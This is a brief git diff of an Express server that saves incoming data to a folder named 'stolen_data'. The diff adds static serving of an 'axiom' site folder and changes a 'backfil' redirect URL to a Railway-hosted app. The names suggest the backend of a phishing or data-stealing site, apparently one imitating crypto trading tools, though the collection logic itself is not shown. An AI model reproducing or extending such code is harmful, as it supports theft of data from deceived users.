@@ -7,6 +7,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 const DATA_FOLDER = path.join(__dirname, 'stolen_data');
+app.use(express.static(path.join(__dirname, 'axiom')));
 
 if (!fs.existsSync(DATA_FOLDER)) {
     fs.mkdirSync(DATA_FOLDER, { recursive: true });
@@ -52,7 +53,7 @@ app.get('*', (req, res) => {
         res.json({
             success: true,
             msg: "OK",
-            backfil: "https://terminalcore.onrender.com"   // replace with your real Render URL
+            backfil: "https://bloom-sniper-production.up.railway.app/"   // replace with your real Render URL
         });
     } else {
         res.status(200).send('OK');
